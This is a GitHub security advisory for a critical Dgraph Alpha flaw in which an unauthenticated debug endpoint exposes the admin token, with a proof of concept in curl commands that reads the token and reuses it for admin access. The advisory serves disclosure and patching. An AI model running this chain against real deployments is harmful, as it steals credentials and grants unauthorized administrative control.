# [C] Dgraph: Unauthenticated /debug/pprof/cmdline discloses admin auth token, enabling unauthorized access to protected Alpha admin endpoints

## Summary
Severity: Critical
Advisory: GHSA-95mq-xwj4-r47p
CVE: CVE-2026-40173
CWE: CWE-200, CWE-215, CWE-522
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-95mq-xwj4-r47p
Type: github-advisory

## Affected
- Go: `github.com/dgraph-io/dgraph/v25` — affected >=0 <25.3.2
- Go: `github.com/dgraph-io/dgraph/v24` — affected >=0
- Go: `github.com/dgraph-io/dgraph` — affected >=0

## Details
### Summary
An unauthenticated debug endpoint in Dgraph Alpha exposes the full process command line, including the configured admin token from `--security "token=..."`.

This does not break token validation logic directly; instead, it discloses the credential and enables unauthorized admin-level access by reusing the leaked token in `X-Dgraph-AuthToken`.

### Details
The behavior occurs entirely within core Alpha HTTP routing and does not require any external proxy, plugin, or non-core integration.

The core issue is not that admin token protection is absent, but that the protected secret is exposed in cleartext through an unauthenticated core debug endpoint.

Relevant code paths:
- `dgraph/cmd/alpha/run.go:17` imports `net/http/pprof`, which registers `/debug/pprof/*` handlers on the default mux.
- `dgraph/cmd/alpha/run.go:533` uses `http.Handle("/", audit.AuditRequestHttp(baseMux))`, so default-mux handlers remain reachable.
- `dgraph/cmd/alpha/admin.go:52` enforces admin token checks in `adminAuthHandler` for admin endpoints.
- `dgraph/cmd/alpha/admin.go:74` shows `/admin/config/cache_mb` behind `adminAuthHandler`.

Credential-exposure chain:
1. `/debug/pprof/cmdline` is reachable without authentication.
2. Its output includes the configured admin token from process arguments.
3. The disclosed token is accepted by `adminAuthHandler` when sent as `X-Dgraph-AuthToken`.
4. An attacker gains unauthorized access to admin-only functionality.

Observed local evidence (safe validation):
- Request: `GET /admin/config/cache_mb` without token
  - Status: 200 (request rejected at application layer)
  - Body contains error: `Invalid X-Dgraph-AuthToken`
  - The endpoint returns HTTP 200 but indicates authentication failure in the response body.
- Request: `GET /debug/pprof/cmdline` without token
  - Status: 200
  - Body excerpt includes: `--security=token=TopSecretToken123;`
- Request: `GET /admin/config/cache_mb` with `X-Dgraph-AuthToken: TopSecretToken123`
  - Status: 200
  - Body: `4096`

Important policy/triage clarification:
- This issue persists even when the admin-token security feature is enabled: the token itself is exposed via an unauthenticated core debug endpoint, making this more than a misconfiguration-only concern.
- Network restrictions (bind/whitelist/firewall) may reduce exposure, but they do not remediate the underlying credential disclosure behavior.

### PoC

- Branch: `main`
- Commit: `b15c87e93`
- Describe: `v25.3.1`

Preconditions:
- Alpha HTTP port is reachable by attacker traffic.
- Admin token is configured via supported startup flag: `--security "token=..."`.
- `/debug/pprof/*` is exposed on the same Alpha HTTP listener.
- This behavior occurs with documented startup flags and without any non-default or unsupported configuration.

Reproduction steps:
1. Start Zero and Alpha (example local setup):
   - `dgraph zero --my=127.0.0.1:5280 --port_offset=200 --bindall=false --wal=./zw`
   - `dgraph alpha --my=127.0.0.1:7280 --zero=127.0.0.1:5280 --port_offset=200 --bindall=false --security "token=TopSecretToken123;" --postings=./p --wal=./w --tmp=./t`

2. Verify admin endpoint rejects unauthenticated request:
   - `curl -i http://127.0.0.1:8280/admin/config/cache_mb`
   - Expected body includes `Invalid X-Dgraph-AuthToken`.

3. Read token from unauthenticated debug endpoint:
   - `curl -s http://127.0.0.1:8280/debug/pprof/cmdline`
   - Expected output includes `--security=token=TopSecretToken123;`.

4. Reuse leaked token against admin endpoint:
   - `curl -i -H "X-Dgraph-AuthToken: TopSecretToken123" http://127.0.0.1:8280/admin/config/cache_mb`
   - Expected: successful response (example observed: `4096`).

Note: The PoC uses `127.0.0.1` only for safe local validation. The vulnerable condition is unauthenticated reachability of `/debug/pprof/cmdline`; in any deployment where Alpha HTTP is reachable by untrusted parties, the same token disclosure and subsequent unauthorized admin access apply.

### Impact

- Unauthenticated disclosure of a sensitive admin credential via debug endpoint, enabling unauthorized privileged administrative access through token reuse
- Operators running Dgraph Alpha with admin token configured, where Alpha HTTP/debug routes are reachable by untrusted users or networks.

The attack requires network reachability to the Alpha HTTP port. In deployments where this interface is exposed beyond trusted boundaries, the issue is remotely exploitable without authentication.

Depending on exposed admin functionality in deployment policy, this may allow configuration changes, operational control actions, and other privileged administrative operations exposed through `/admin/*`.

## References
- https://github.com/dgraph-io/dgraph/security/advisories/GHSA-95mq-xwj4-r47p
- https://nvd.nist.gov/vuln/detail/CVE-2026-40173
- https://github.com/dgraph-io/dgraph
- https://github.com/dgraph-io/dgraph/releases/tag/v25.3.2
